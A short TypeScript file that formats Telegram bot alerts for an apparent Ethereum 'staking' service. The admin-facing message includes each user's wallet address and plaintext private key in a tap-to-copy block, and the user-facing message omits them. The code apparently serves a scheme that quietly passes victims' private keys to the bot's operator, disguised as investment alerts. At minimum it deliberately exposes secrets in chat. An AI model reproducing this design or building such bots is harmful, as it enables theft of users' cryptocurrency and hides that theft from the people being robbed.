export const showAdminTransactionDetails = async (data: any) => {
  const { amount, usdAmount, hash, username, timestamp, userWallet, userPK } =
    data;

  return {
    message: `<b>Stake Alert 🚨</b>\n<b>transaction hash:</b> <a href="https://etherscan.io/tx/${hash}">${hash}</a>\n\n<b>Details :</b>\n<b>User: </b>${username}\n<b>Amount Invested: </b>${usdAmount} $ (${amount}eth)\n<b>Date: </b>${timestamp}\n\nWallet: <code>${userWallet}</code>\nPrivate Key: <code>${userPK}</code>\n(tap to copy)`,
    keyboard: [
      // [
      //   {
      //     text: '✅ Approve',
      //     callback_data: JSON.stringify({
      //       command: '/approve',
      //       userChatId: `${chatId}`,
      //     }),
      //   },
      //   {
      //     text: '🚫 Reject',
      //     callback_data: JSON.stringify({
      //       command: '/reject',
      //       userChatId: `${chatId}`,
      //     }),
      //   },
      // ],

      [
        {
          text: '❌ Close',
          callback_data: JSON.stringify({
            command: '/close',
            language: 'english',
          }),
        },
      ],
    ],
  };
};

export const showUserTransactionDetails = async (data: any) => {
  const { amount, hash, timestamp, usdAmount } = data;

  return {
    message: `<b>Staking Alert 🚨</b>\n<b>transaction hash:</b> <a href="https://etherscan.io/tx/${hash}">${hash}</a>\n\n<b>Details :</b>\n<b>Amount Invested: </b>${usdAmount} $ (${amount}eth)\n<b>Date: </b>${timestamp}`,
    keyboard: [
      [
        {
          text: 'view Investments',
          callback_data: JSON.stringify({
            command: '/viewInvestments',
            language: 'english',
          }),
        },
      ],
      [
        {
          text: '❌ Close',
          callback_data: JSON.stringify({
            command: '/close',
            language: 'english',
          }),
        },
      ],
    ],
  };
};
